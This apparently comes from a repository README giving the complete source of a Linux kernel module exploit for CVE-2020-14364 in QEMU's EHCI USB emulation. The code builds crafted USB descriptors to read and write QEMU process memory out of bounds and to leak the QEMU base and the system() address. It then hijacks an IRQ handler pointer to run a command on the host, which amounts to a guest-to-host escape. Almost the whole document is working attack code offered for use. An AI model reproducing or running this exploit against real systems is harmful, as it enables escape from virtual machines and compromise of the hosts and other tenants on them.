It's about the CVE-2020-14364.

The file structure as follows.

- the exploit code and the qemu.
- start_qemu
  - launch.sh -> debug qemu bash file.
  - normal_launch.sh -> start qemu process without gdb.

I write the exploit with the kernel module, and you can get the detailed principle about the cve from the code.If you have some trouble in it,please contact me with my email.

### Exploit

```
#include <linux/module.h>
#include <linux/init.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>

#define MEM_AREA 0xfebf1000
#define USB_TOKEN_OUT 0
#define USB_TOKEN_IN 1
#define USB_TOKEN_SETUP 2

#define USBCMD           0x0000
#define USBCMD_RUNSTOP   (1 << 0)      // run / Stop
#define USBCMD_HCRESET   (1 << 1)      // HC Reset
#define USBCMD_FLS       (3 << 2)      // Frame List Size
#define USBCMD_FLS_SH    2             // Frame List Size Shift
#define USBCMD_PSE       (1 << 4)      // Periodic Schedule Enable
#define USBCMD_ASE       (1 << 5)      // Asynch Schedule Enable
#define USBCMD_IAAD      (1 << 6)      // Int Asynch Advance Doorbell
#define USBCMD_LHCR      (1 << 7)      // Light Host Controller Reset
#define USBCMD_ASPMC     (3 << 8)      // Async Sched Park Mode Count
#define USBCMD_ASPME     (1 << 11)     // Async Sched Park Mode Enable
#define USBCMD_ITC       (0x7f << 16)  // Int Threshold Control
#define USBCMD_ITC_SH    16            // Int Threshold Control Shift

typedef struct EHCIqh {
    uint32_t next;                    /* Standard next link pointer */

    /* endpoint characteristics */
    uint32_t epchar;
#define QH_EPCHAR_RL_MASK             0xf0000000
#define QH_EPCHAR_RL_SH               28
#define QH_EPCHAR_C                   (1 << 27)
#define QH_EPCHAR_MPLEN_MASK          0x07FF0000
#define QH_EPCHAR_MPLEN_SH            16
#define QH_EPCHAR_H                   (1 << 15)
#define QH_EPCHAR_DTC                 (1 << 14)
#define QH_EPCHAR_EPS_MASK            0x00003000
#define QH_EPCHAR_EPS_SH              12
#define EHCI_QH_EPS_FULL              0
#define EHCI_QH_EPS_LOW               1
#define EHCI_QH_EPS_HIGH              2
#define EHCI_QH_EPS_RESERVED          3

#define QH_EPCHAR_EP_MASK             0x00000f00
#define QH_EPCHAR_EP_SH               8
#define QH_EPCHAR_I                   (1 << 7)
#define QH_EPCHAR_DEVADDR_MASK        0x0000007f
#define QH_EPCHAR_DEVADDR_SH          0

    /* endpoint capabilities */
    uint32_t epcap;
#define QH_EPCAP_MULT_MASK            0xc0000000
#define QH_EPCAP_MULT_SH              30
#define QH_EPCAP_PORTNUM_MASK         0x3f800000
#define QH_EPCAP_PORTNUM_SH           23
#define QH_EPCAP_HUBADDR_MASK         0x007f0000
#define QH_EPCAP_HUBADDR_SH           16
#define QH_EPCAP_CMASK_MASK           0x0000ff00
#define QH_EPCAP_CMASK_SH             8
#define QH_EPCAP_SMASK_MASK           0x000000ff
#define QH_EPCAP_SMASK_SH             0

    uint32_t current_qtd;             /* Standard next link pointer */
    uint32_t next_qtd;                /* Standard next link pointer */
    uint32_t altnext_qtd;
#define QH_ALTNEXT_NAKCNT_MASK        0x0000001e
#define QH_ALTNEXT_NAKCNT_SH          1

    uint32_t token;                   /* Same as QTD token */
    uint32_t bufptr[5];               /* Standard buffer pointer */
#define BUFPTR_CPROGMASK_MASK         0x000000ff
#define BUFPTR_FRAMETAG_MASK          0x0000001f
#define BUFPTR_SBYTES_MASK            0x00000fe0
#define BUFPTR_SBYTES_SH              5
} EHCIqh;

typedef struct EHCIqtd {
    uint32_t next;                    /* Standard next link pointer */
    uint32_t altnext;                 /* Standard next link pointer */
    uint32_t token;
#define QTD_TOKEN_DTOGGLE             (1 << 31)
#define QTD_TOKEN_TBYTES_MASK         0x7fff0000
#define QTD_TOKEN_TBYTES_SH           16
#define QTD_TOKEN_IOC                 (1 << 15)
#define QTD_TOKEN_CPAGE_MASK          0x00007000
#define QTD_TOKEN_CPAGE_SH            12
#define QTD_TOKEN_CERR_MASK           0x00000c00
#define QTD_TOKEN_CERR_SH             10
#define QTD_TOKEN_PID_MASK            0x00000300
#define QTD_TOKEN_PID_SH              8
#define QTD_TOKEN_ACTIVE              (1 << 7)
#define QTD_TOKEN_HALT                (1 << 6)
#define QTD_TOKEN_DBERR               (1 << 5)
#define QTD_TOKEN_BABBLE              (1 << 4)
#define QTD_TOKEN_XACTERR             (1 << 3)
#define QTD_TOKEN_MISSEDUF            (1 << 2)
#define QTD_TOKEN_SPLITXSTATE         (1 << 1)
#define QTD_TOKEN_PING                (1 << 0)

    uint32_t bufptr[5];               /* Standard buffer pointer */
#define QTD_BUFPTR_MASK               0xfffff000
#define QTD_BUFPTR_SH                 12
} EHCIqtd;

void *mem_base;
void *asyn_addr;
void *packet_1_base_addr;
void *packet_2_base_addr;
void *packet_3_base_addr;
void *packet_4_base_addr;
void *packet_5_base_addr;

// struct {
//     uint32_t usbcmd;
//     uint32_t usbsts;
//     uint32_t usbintr;
//     uint32_t frindex;
//     uint32_t ctrldssegment;
//     uint32_t periodiclistbase;
//     uint32_t asynclistaddr;
//     uint32_t notused[9];
//     uint32_t configflag;
// };

void init_malloc_area(void){
    mem_base = ioremap(MEM_AREA,0x1000);
    mem_base += 0x20; // len:0x44
    asyn_addr = kmalloc(0x4000,GFP_KERNEL);
    packet_1_base_addr = kmalloc(0x1000,GFP_KERNEL);
    packet_2_base_addr = kmalloc(0x1000,GFP_KERNEL);
    packet_3_base_addr = kmalloc(0x2000,GFP_KERNEL);
    packet_4_base_addr = kmalloc(0x2000,GFP_KERNEL);
    packet_5_base_addr = kmalloc(0x1000,GFP_KERNEL);
    memset(asyn_addr,0,0x4000);
    memset(packet_1_base_addr,0,0x1000);
    memset(packet_2_base_addr,0,0x1000);
    memset(packet_3_base_addr,0,0x2000);
    memset(packet_4_base_addr,0,0x2000);
    memset(packet_5_base_addr,0,0x1000);
}

void set_usbcmd(u32 val){
    writel(val,mem_base);
}

void set_frindex(u32 val){
    val = val & 0x3fff;
    writel(val,mem_base+0xc);
}

void set_asynclistaddr(u32 val){
    writel(val,mem_base+0x18);
}

void set_usbsts(u32 val){
    writel(val,mem_base+0x4);
}

void write_any(int write_offset,u32 val)
{
    void *qtd_1_packet;
    void *qtd_2_packet;
    void *qtd_3_packet;
    void *qtd_4_packet;
    EHCIqh *qh_1;
    EHCIqh *qh_2;
    EHCIqtd *qtd_1;
    EHCIqtd *qtd_2;
    EHCIqtd *qtd_3;
    EHCIqtd *qtd_4;

    memset(asyn_addr,0,0x4000);
    memset(packet_1_base_addr,0,0x1000);
    memset(packet_2_base_addr,0,0x1000);
    memset(packet_3_base_addr,0,0x2000);
    memset(packet_4_base_addr,0,0x2000);

    qh_1 = asyn_addr;
    qh_2 = asyn_addr + 0x100;
    qtd_1 = asyn_addr + 0x1000;
    qtd_2 = asyn_addr + 0x1000 + sizeof(EHCIqtd);
    qtd_3 = asyn_addr + 0x1000 + 2*sizeof(EHCIqtd);
    qtd_4 = asyn_addr + 0x1000 + 3*sizeof(EHCIqtd);
    qtd_1_packet = packet_1_base_addr;
    qtd_2_packet = packet_2_base_addr;
    qtd_3_packet = packet_3_base_addr;
    qtd_4_packet = packet_4_base_addr;

    ((u8 *)qtd_1_packet)[0] = 0;
    ((u8 *)qtd_1_packet)[1] = 1;
    ((u8 *)qtd_1_packet)[2] = 1;
    ((u8 *)qtd_1_packet)[3] = 1;
    ((u8 *)qtd_1_packet)[4] = 1;
    ((u8 *)qtd_1_packet)[5] = 1;
    ((u8 *)qtd_1_packet)[6] = 1;//s->setup_len
    ((u8 *)qtd_1_packet)[7] = 1;//s->setup_len

    ((u8 *)qtd_2_packet)[0] = 0;
    ((u8 *)qtd_2_packet)[1] = 1;
    ((u8 *)qtd_2_packet)[2] = 1;
    ((u8 *)qtd_2_packet)[3] = 1;
    ((u8 *)qtd_2_packet)[4] = 1;
    ((u8 *)qtd_2_packet)[5] = 1;
    ((u8 *)qtd_2_packet)[6] = 0xFF;//s->setup_len
    ((u8 *)qtd_2_packet)[7] = 0xFF;//s->setup_len

    *(u32 *)(qtd_3_packet+0x1000) = 0x1234; //remote_wakeup
    *(u32 *)(qtd_3_packet+0x1004) = 2; //setup_state
    *(u32 *)(qtd_3_packet+0x1008) = write_offset+4; //setup_len
    *(u32 *)(qtd_3_packet+0x100c) = write_offset-0x1010; //setup_index

    *(u32 *)(qtd_4_packet) = val;

    qh_1->next = virt_to_phys(qh_2) + 2; // NLPTR_TYPE_QH
    qh_1->epchar = QH_EPCHAR_H | EHCI_QH_EPS_HIGH | ((0 << QH_EPCHAR_EP_SH) & QH_EPCHAR_EP_MASK); //dev->addr = 2, endpoint->endp = 0, 
    qh_1->epcap = QH_EPCAP_PORTNUM_SH;
    qh_1->current_qtd = virt_to_phys(qtd_1);
    qh_1->next_qtd = virt_to_phys(asyn_addr);
    qh_1->altnext_qtd = virt_to_phys(asyn_addr);
    qh_1->token = QTD_TOKEN_ACTIVE;
    qh_1->bufptr[0] = 2;
    qh_1->bufptr[1] = 3;
    qh_1->bufptr[2] = 4;
    qh_1->bufptr[3] = 5;
    qh_1->bufptr[4] = 6;

    qtd_1->next = virt_to_phys(qtd_2);
    qtd_1->altnext = 1;     // bit1 = 1 invaild
    qtd_1->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_SETUP << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x8 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x5000, pid=setup, cpage=0 , bytes=0x5000
    qtd_1->bufptr[0] = virt_to_phys(qtd_1_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_1->bufptr[1] = virt_to_phys(qtd_1_packet+0x1000) & QTD_BUFPTR_MASK;
    qtd_1->bufptr[2] = virt_to_phys(qtd_1_packet+0x2000) & QTD_BUFPTR_MASK;
    qtd_1->bufptr[3] = virt_to_phys(qtd_1_packet+0x3000) & QTD_BUFPTR_MASK;
    qtd_1->bufptr[4] = virt_to_phys(qtd_1_packet+0x4000) & QTD_BUFPTR_MASK;

    qtd_2->next = virt_to_phys(qtd_3);
    qtd_2->altnext = 1;     // bit1 = 1 invaild
    qtd_2->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_SETUP << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x8 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x5000, pid=setup, cpage=0 , bytes=0x5000
    qtd_2->bufptr[0] = virt_to_phys(qtd_2_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_2->bufptr[1] = 1;
    qtd_2->bufptr[2] = 2;
    qtd_2->bufptr[3] = 3;
    qtd_2->bufptr[4] = 4;


    qh_2->next = virt_to_phys(qh_2) + 2;
    qh_2->epchar = QH_EPCHAR_H | EHCI_QH_EPS_HIGH | ((0 << QH_EPCHAR_EP_SH) & QH_EPCHAR_EP_MASK); //dev->addr = 2, endpoint->endp = 0, 
    qh_2->epcap = QH_EPCAP_PORTNUM_SH;
    qh_2->current_qtd = virt_to_phys(qtd_3);
    qh_2->next_qtd = virt_to_phys(asyn_addr);
    qh_2->altnext_qtd = virt_to_phys(asyn_addr);
    qh_2->token = QTD_TOKEN_ACTIVE;
    qh_2->bufptr[0] = 2;
    qh_2->bufptr[1] = 3;
    qh_2->bufptr[2] = 4;
    qh_2->bufptr[3] = 5;
    qh_2->bufptr[4] = 6;

    qtd_3->next = virt_to_phys(qtd_4); // next qtd vaild
    qtd_3->altnext = 1;     // bit1 = 1 invaild
    qtd_3->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_OUT << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x1010 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x1010, pid=setup, cpage=0 , bytes=0x5000
    qtd_3->bufptr[0] = virt_to_phys(qtd_3_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_3->bufptr[1] = virt_to_phys(qtd_3_packet+0x1000) & QTD_BUFPTR_MASK;
    qtd_3->bufptr[2] = virt_to_phys(qtd_3_packet+0x2000) & QTD_BUFPTR_MASK;
    qtd_3->bufptr[3] = virt_to_phys(qtd_3_packet+0x3000) & QTD_BUFPTR_MASK;
    qtd_3->bufptr[4] = virt_to_phys(qtd_3_packet+0x4000) & QTD_BUFPTR_MASK;


    qtd_4->next = virt_to_phys(qtd_4)+1; // next qtd invaild
    qtd_4->altnext = 1;     // bit1 = 1 invaild
    qtd_4->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_OUT << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x1010 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x1010, pid=setup, cpage=0 , bytes=0x5000
    qtd_4->bufptr[0] = virt_to_phys(qtd_4_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_4->bufptr[1] = virt_to_phys(qtd_4_packet+0x1000) & QTD_BUFPTR_MASK;
    qtd_4->bufptr[2] = virt_to_phys(qtd_4_packet+0x2000) & QTD_BUFPTR_MASK;
    qtd_4->bufptr[3] = virt_to_phys(qtd_4_packet+0x3000) & QTD_BUFPTR_MASK;
    qtd_4->bufptr[4] = virt_to_phys(qtd_4_packet+0x4000) & QTD_BUFPTR_MASK;

    set_frindex(0x0);
    set_asynclistaddr(virt_to_phys(asyn_addr));
    set_usbcmd(USBCMD_RUNSTOP | USBCMD_ASE);//set the state SETUP_STATE_DATA

    mdelay(5); // ***important***
}

static u32 read_any(int read_offset){
    void *qtd_1_packet;
    void *qtd_2_packet;
    void *qtd_3_packet;
    void *qtd_4_packet;
    void *qtd_5_packet;
    EHCIqh *qh_1;
    EHCIqh *qh_2;
    EHCIqtd *qtd_1;
    EHCIqtd *qtd_2;
    EHCIqtd *qtd_3;
    EHCIqtd *qtd_4;
    EHCIqtd *qtd_5;

    memset(asyn_addr,0,0x4000);
    memset(packet_1_base_addr,0,0x1000);
    memset(packet_2_base_addr,0,0x1000);
    memset(packet_3_base_addr,0,0x2000);
    memset(packet_4_base_addr,0,0x2000);
    memset(packet_5_base_addr,0,0x1000);

    qh_1 = asyn_addr;
    qh_2 = asyn_addr + 0x100;
    qtd_1 = asyn_addr + 0x1000;
    qtd_2 = asyn_addr + 0x1000 + sizeof(EHCIqtd);
    qtd_3 = asyn_addr + 0x1000 + 2*sizeof(EHCIqtd);
    qtd_4 = asyn_addr + 0x1000 + 3*sizeof(EHCIqtd);
    qtd_5 = asyn_addr + 0x1000 + 4*sizeof(EHCIqtd);
    qtd_1_packet = packet_1_base_addr;
    qtd_2_packet = packet_2_base_addr;
    qtd_3_packet = packet_3_base_addr;
    qtd_4_packet = packet_4_base_addr;
    qtd_5_packet = packet_5_base_addr;

    ((u8 *)qtd_1_packet)[0] = 0;
    ((u8 *)qtd_1_packet)[1] = 1;
    ((u8 *)qtd_1_packet)[2] = 1;
    ((u8 *)qtd_1_packet)[3] = 1;
    ((u8 *)qtd_1_packet)[4] = 1;
    ((u8 *)qtd_1_packet)[5] = 1;
    ((u8 *)qtd_1_packet)[6] = 1;//s->setup_len
    ((u8 *)qtd_1_packet)[7] = 1;//s->setup_len

    ((u8 *)qtd_2_packet)[0] = 0;
    ((u8 *)qtd_2_packet)[1] = 1;
    ((u8 *)qtd_2_packet)[2] = 1;
    ((u8 *)qtd_2_packet)[3] = 1;
    ((u8 *)qtd_2_packet)[4] = 1;
    ((u8 *)qtd_2_packet)[5] = 1;
    ((u8 *)qtd_2_packet)[6] = 0xFF;//s->setup_len
    ((u8 *)qtd_2_packet)[7] = 0xFF;//s->setup_len

    *(u32 *)(qtd_3_packet+0x1000) = 0x1234; //remote_wakeup
    *(u32 *)(qtd_3_packet+0x1004) = 2; //setup_state       SETUP_STATE_DATA
    *(u32 *)(qtd_3_packet+0x1008) = -8+0x1020; //setup_len
    *(u32 *)(qtd_3_packet+0x100c) = -8-0x1010; //setup_index

    *(u32 *)(qtd_4_packet) = 0x80; //USB_DIR_IN
    *(u32 *)(qtd_4_packet+0x1000+8) = 0x1234; //remote_wakeup
    *(u32 *)(qtd_4_packet+0x1004+8) = 2; //setup_state       SETUP_STATE_DATA
    *(u32 *)(qtd_4_packet+0x1008+8) = read_offset+4; //setup_len
    *(u32 *)(qtd_4_packet+0x100c+8) = read_offset-0x1020; //setup_index

    // *(u32 *)(qtd_5_packet) = 'A';

    qh_1->next = virt_to_phys(qh_2) + 2; // NLPTR_TYPE_QH
    qh_1->epchar = QH_EPCHAR_H | EHCI_QH_EPS_HIGH | ((0 << QH_EPCHAR_EP_SH) & QH_EPCHAR_EP_MASK); //dev->addr = 2, endpoint->endp = 0, 
    qh_1->epcap = QH_EPCAP_PORTNUM_SH;
    qh_1->current_qtd = virt_to_phys(qtd_1);
    qh_1->next_qtd = virt_to_phys(asyn_addr);
    qh_1->altnext_qtd = virt_to_phys(asyn_addr);
    qh_1->token = QTD_TOKEN_ACTIVE;
    qh_1->bufptr[0] = 2;
    qh_1->bufptr[1] = 3;
    qh_1->bufptr[2] = 4;
    qh_1->bufptr[3] = 5;
    qh_1->bufptr[4] = 6;

    //it's used to set the p.status
    qtd_1->next = virt_to_phys(qtd_2);
    qtd_1->altnext = 1;     // bit1 = 1 invaild
    qtd_1->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_SETUP << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x8 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x5000, pid=setup, cpage=0 , bytes=0x5000
    qtd_1->bufptr[0] = virt_to_phys(qtd_1_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_1->bufptr[1] = virt_to_phys(qtd_1_packet+0x1000) & QTD_BUFPTR_MASK;
    qtd_1->bufptr[2] = virt_to_phys(qtd_1_packet+0x2000) & QTD_BUFPTR_MASK;
    qtd_1->bufptr[3] = virt_to_phys(qtd_1_packet+0x3000) & QTD_BUFPTR_MASK;
    qtd_1->bufptr[4] = virt_to_phys(qtd_1_packet+0x4000) & QTD_BUFPTR_MASK;

    //it's used to set the setup_len
    qtd_2->next = virt_to_phys(qtd_3);
    qtd_2->altnext = 1;     // bit1 = 1 invaild
    qtd_2->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_SETUP << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x8 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x5000, pid=setup, cpage=0 , bytes=0x5000
    qtd_2->bufptr[0] = virt_to_phys(qtd_2_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_2->bufptr[1] = 1;
    qtd_2->bufptr[2] = 2;
    qtd_2->bufptr[3] = 3;
    qtd_2->bufptr[4] = 4;


    qh_2->next = virt_to_phys(qh_2) + 2;
    qh_2->epchar = QH_EPCHAR_H | EHCI_QH_EPS_HIGH | ((0 << QH_EPCHAR_EP_SH) & QH_EPCHAR_EP_MASK); //dev->addr = 2, endpoint->endp = 0, 
    qh_2->epcap = QH_EPCAP_PORTNUM_SH;
    qh_2->current_qtd = virt_to_phys(qtd_3);
    qh_2->next_qtd = virt_to_phys(asyn_addr);
    qh_2->altnext_qtd = virt_to_phys(asyn_addr);
    qh_2->token = QTD_TOKEN_ACTIVE;
    qh_2->bufptr[0] = 2;
    qh_2->bufptr[1] = 3;
    qh_2->bufptr[2] = 4;
    qh_2->bufptr[3] = 5;
    qh_2->bufptr[4] = 6;

    qtd_3->next = virt_to_phys(qtd_4); // next qtd vaild
    qtd_3->altnext = 1;     // bit1 = 1 invaild
    qtd_3->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_OUT << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x1010 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x1010, pid=setup, cpage=0 , bytes=0x5000
    qtd_3->bufptr[0] = virt_to_phys(qtd_3_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_3->bufptr[1] = virt_to_phys(qtd_3_packet+0x1000) & QTD_BUFPTR_MASK;
    qtd_3->bufptr[2] = virt_to_phys(qtd_3_packet+0x2000) & QTD_BUFPTR_MASK;
    qtd_3->bufptr[3] = virt_to_phys(qtd_3_packet+0x3000) & QTD_BUFPTR_MASK;
    qtd_3->bufptr[4] = virt_to_phys(qtd_3_packet+0x4000) & QTD_BUFPTR_MASK;


    qtd_4->next = virt_to_phys(qtd_5); // next qtd vaild
    qtd_4->altnext = 1;     // bit1 = 1 invaild
    qtd_4->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_OUT << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x1020 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x1010, pid=setup, cpage=0 , bytes=0x5000, it can be any number
    qtd_4->bufptr[0] = virt_to_phys(qtd_4_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_4->bufptr[1] = virt_to_phys(qtd_4_packet+0x1000) & QTD_BUFPTR_MASK;
    qtd_4->bufptr[2] = virt_to_phys(qtd_4_packet+0x2000) & QTD_BUFPTR_MASK;
    qtd_4->bufptr[3] = virt_to_phys(qtd_4_packet+0x3000) & QTD_BUFPTR_MASK;
    qtd_4->bufptr[4] = virt_to_phys(qtd_4_packet+0x4000) & QTD_BUFPTR_MASK;

    qtd_5->next = virt_to_phys(qtd_5)+1; // next qtd invaild
    qtd_5->altnext = 1;     // bit1 = 1 invaild
    qtd_5->token = QTD_TOKEN_ACTIVE | ((USB_TOKEN_IN << QTD_TOKEN_PID_SH) & QTD_TOKEN_PID_MASK) \
    | ((0 << QTD_TOKEN_CPAGE_SH) & QTD_TOKEN_CPAGE_MASK) | ((0x1010 << QTD_TOKEN_TBYTES_SH) & QTD_TOKEN_TBYTES_MASK); // size=0x1010, pid=setup, cpage=0 , bytes=0x5000, it can be any number
    qtd_5->bufptr[0] = virt_to_phys(qtd_5_packet) & QTD_BUFPTR_MASK; // offset=0x0
    qtd_5->bufptr[1] = virt_to_phys(qtd_5_packet+0x1000) & QTD_BUFPTR_MASK;
    qtd_5->bufptr[2] = virt_to_phys(qtd_5_packet+0x2000) & QTD_BUFPTR_MASK;
    qtd_5->bufptr[3] = virt_to_phys(qtd_5_packet+0x3000) & QTD_BUFPTR_MASK;
    qtd_5->bufptr[4] = virt_to_phys(qtd_5_packet+0x4000) & QTD_BUFPTR_MASK;

    set_frindex(0x0);
    set_asynclistaddr(virt_to_phys(asyn_addr));
    set_usbcmd(USBCMD_RUNSTOP | USBCMD_ASE);//set the state SETUP_STATE_DATA

    mdelay(5); // must be added,unless the data will be 0.    ***important***

    return *(u32 *)(qtd_5_packet);
}

static int start_attack(void){
    u32 usbdev_low;
    u64 usbdev_high;
    u64 usb_dev_addr;
    u64 data_buf_addr;
    u64 usbport_addr;
    u32 usbport_low;
    u64 usbport_high;
    u64 usbport;
    u32 ops_addr_low;
    u64 ops_addr_high;
    u64 ops_addr;
    u32 attach_addr_low;
    u64 attach_addr_high;
    u64 attach_addr;
    u64 qemu_base_addr;
    u64 system_plt;
    u64 ehci_state;
    u64 irq_addr;
    u32 irq_low;
    u64 irq_high;
    u64 irq;
    u32 irq_handler_low;
    u32 irq_handler_high;
    u64 irq_handler;
    u32 irq_opaque_low;
    u32 irq_opaque_high;
    u64 irq_opaque;

    init_malloc_area();

    usbdev_low = read_any(0x1024);
    usbdev_high = read_any(0x1024+4);
    usb_dev_addr = ((usbdev_high << 32) | usbdev_low);
    data_buf_addr = usb_dev_addr + 0xec;
    usbport_addr = usb_dev_addr + 0x88;
    usbport_low = read_any(usbport_addr - data_buf_addr);
    usbport_high = read_any(usbport_addr - data_buf_addr + 4);
    usbport = ((usbport_high << 32) | usbport_low);

    ops_addr_low = read_any(usbport + 0x20 - data_buf_addr);
    ops_addr_high = read_any(usbport + 0x20 - data_buf_addr + 4);
    ops_addr = ((ops_addr_high << 32) | ops_addr_low);

    attach_addr_low = read_any(ops_addr - data_buf_addr);
    attach_addr_high = read_any(ops_addr - data_buf_addr + 4);
    attach_addr = ((attach_addr_high << 32) | attach_addr_low);

    qemu_base_addr = attach_addr - 0x33f0d4;
    system_plt = qemu_base_addr + 0x2d9460;
    ehci_state = usbport - 0x540;
    irq_addr = ehci_state + 0xc8;

    irq_low = read_any(irq_addr - data_buf_addr);
    irq_high = read_any(irq_addr - data_buf_addr + 4);
    irq = ((irq_high << 32) | irq_low);

    irq_handler = irq + 0x28;
    irq_opaque = irq + 0x30;

    printk("[*] The USBDevice addr is: 0x%llx\n",usb_dev_addr);
    printk("[*] The USBPort addr is: 0x%llx\n",usbport);
    printk("[*] The USBPortOps addr is: 0x%llx\n",ops_addr);
    printk("[*] The attach addr is: 0x%llx\n",attach_addr);
    printk("[*] The QEMUBase addr is: 0x%llx\n",qemu_base_addr);
    printk("[*] The System addr is: 0x%llx\n",system_plt);
    printk("[*] The ehci addr is: 0x%llx\n",ehci_state);
    printk("[*] The irq addr is: 0x%llx\n",irq);

    // mdelay(3000); // debug

    irq_handler_low = system_plt & 0xFFFFFFFF;
    irq_handler_high = (system_plt >> 32) & 0xFFFFFFFF;
    write_any((irq_handler - data_buf_addr),irq_handler_low);
    write_any((irq_handler - data_buf_addr + 4),irq_handler_high);

    write_any(-0x37,0x6d6f6e67);     // write shellcode -> "gnome-caculator"
    write_any(-0x37+4,0x61632d65);
    write_any(-0x37+8,0x6c75636c);
    write_any(-0x37+12,0x726f7461);

    irq_opaque_low = (data_buf_addr-0x37) & 0xFFFFFFFF;           // use the product_desc as the shellcode area
    irq_opaque_high = ((data_buf_addr-0x37) >> 32) & 0xFFFFFFFF;
    write_any((irq_opaque - data_buf_addr),irq_opaque_low);
    write_any((irq_opaque - data_buf_addr + 4),irq_opaque_high);

    // mdelay(3000);

    write_any(-0x37,0x74697865); // shellcode -> "exit"
    write_any(-0x37+4,0x0);

    // set_usbsts(0); // trigger the irq func

    return 0;
}

static void exit_attack(void){
	printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");
```

